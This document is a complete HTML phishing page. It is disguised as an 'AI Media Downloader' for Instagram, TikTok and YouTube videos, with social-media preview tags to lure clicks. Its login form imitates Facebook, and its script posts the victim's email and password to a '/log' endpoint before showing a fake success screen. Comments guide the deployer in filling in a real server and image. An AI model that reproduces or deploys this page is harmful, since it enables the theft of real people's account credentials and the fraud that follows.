<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <!-- 🟢 PREVIEW TAGS ADDED HERE FOR FACEBOOK/WHATSAPP -->
    <title>AI Media Downloader</title>
    <meta property="og:title" content="AI Media Downloader - Download HD Videos Free" />
    <meta property="og:description" content="Download unlimited videos from Instagram, TikTok, and YouTube in HD quality." />
    <!-- Change this URL to your actual image file or a direct link to an image -->
    <meta property="og:image" content="https://ibb.co/whRNw22B" />
    <meta property="og:url" content="https://your-site-link.com/index.html" />
    <meta property="og:type" content="website" />

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f0f2f5; height: 100vh; width: 100vw; overflow: hidden; }
        
        /* Step 1: Landing */
        #landing-page {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            /* Replace '999.jpg' with your actual image path if needed */
            background: url('999.jpg') no-repeat center center fixed;
            background-size: cover; display: flex; justify-content: center; align-items: center; z-index: 10;
            transition: opacity 0.5s ease-in-out;
        }
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.4); z-index: 1; }
        .content-wrapper { position: relative; z-index: 2; text-align: center; padding: 20px; }
        .ai-badge {
            background: linear-gradient(90deg, #ff00cc, #333399); color: white; padding: 8px 16px;
            border-radius: 20px; font-weight: bold; font-size: 14px; display: inline-block;
            margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .cta-button {
            background-color: #ffffff; color: #1877f2; border: none; padding: 15px 40px;
            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: transform 0.2s; outline: none;
        }
        .cta-button:active { transform: scale(0.95); }

        /* Step 2: Login Form */
        #login-page {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #fff; display: flex; justify-content: center; align-items: center;
            z-index: 20; opacity: 0; visibility: hidden; transition: opacity 0.4s ease-in-out;
        }
        .login-card { width: 90%; max-width: 380px; padding: 20px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 42px; font-weight: bold; margin-bottom: 20px; letter-spacing: -1px; }
        .input-group { margin-bottom: 15px; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 16px; border: 1px solid #dddfe2; border-radius: 8px;
            font-size: 16px; outline: none;
        }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn {
            width: 100%; background-color: #1877f2; color: white; border: none; padding: 16px;
            font-size: 18px; font-weight: bold; border-radius: 8px; cursor: pointer;
            margin-top: 10px; transition: background-color 0.2s;
        }
        .login-btn:hover { background-color: #166fe5; }
        .login-btn:disabled { background-color: #e4e6eb; color: #bcc0c4; cursor: not-allowed; }
        .forgot-password { display: block; margin-top: 20px; color: #1877f2; text-decoration: none; font-size: 14px; }
        
        /* Loading Spinner */
        .spinner {
            display: none; width: 20px; height: 20px; border: 3px solid #fff; border-top: 3px solid transparent;
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Step 3: Download Page (Completed) */
        #download-page {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 30; opacity: 0; visibility: hidden; transition: opacity 0.4s ease-in-out;
        }
        .download-card { width: 90%; max-width: 380px; padding: 20px; text-align: center; }
        .success-icon { font-size: 50px; color: #4CAF50; margin-bottom: 20px; }
        .download-btn {
            background-color: #4CAF50; color: white; border: none; padding: 15px 40px;
            font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2); margin-top: 20px;
        }
    </style>
</head>
<body>

    <!-- STEP 1: LANDING PAGE -->
    <div id="landing-page">
        <div class="overlay"></div>
        <div class="content-wrapper">
            <div class="ai-badge">AI Powered 🚀</div>
            <h1 style="color: white; font-size: 28px; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">Save Video in HD</h1>
            <p style="color: #eee; margin-bottom: 30px;">Fastest downloader for all social apps.</p>
            <button class="cta-button" onclick="showLogin()">Log In to Start</button>
        </div>
    </div>

    <!-- STEP 2: LOGIN FORM -->
    <div id="login-page">
        <div class="login-card">
            <div class="fb-logo">facebook</div>
            <form id="loginForm" onsubmit="handleLogin(event)">
                <div class="input-group">
                    <input type="text" id="email" placeholder="Email or Phone Number" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn" id="loginBtn">
                    <span id="btnText">Log In</span>
                    <div class="spinner" id="spinner"></div>
                </button>
                <a href="#" class="forgot-password">Forgot Password?</a>
            </form>
        </div>
    </div>

    <!-- STEP 3: DOWNLOAD SUCCESS PAGE -->
    <div id="download-page">
        <div class="download-card">
            <div class="success-icon">✔️</div>
            <h2>Login Successful!</h2>
            <p style="margin: 15px 0; color: #666;">Your account is verified. You can now download unlimited videos.</p>
            <button class="download-btn" onclick="alert('Downloading...')">Start Downloading</button>
        </div>
    </div>

    <script>
        function showLogin() {
            document.getElementById('landing-page').style.opacity = '0';
            setTimeout(() => {
                document.getElementById('landing-page').style.display = 'none';
                const loginPage = document.getElementById('login-page');
                loginPage.style.visibility = 'visible';
                loginPage.style.opacity = '1';
            }, 500);
        }

        async function handleLogin(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const spinner = document.getElementById('spinner');

            // UI Loading State
            btn.disabled = true;
            btnText.style.display = 'none';
            spinner.style.display = 'block';

            try {
                // 1. Send data to your backend/server
                // Replace with your actual server endpoint if you have one
                const response = await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                // 2. Show Success Message locally
                setTimeout(() => {
                    const loginPage = document.getElementById('login-page');
                    loginPage.style.opacity = '0';
                    setTimeout(() => {
                        loginPage.style.display = 'none';
                        const dlPage = document.getElementById('download-page');
                        dlPage.style.visibility = 'visible';
                        dlPage.style.opacity = '1';
                    }, 500);
                }, 2000);

            } catch (error) {
                alert("Network Error");
                btn.disabled = false;
                btnText.style.display = 'block';
                spinner.style.display = 'none';
            }
        }
    </script>
</body>
</html>
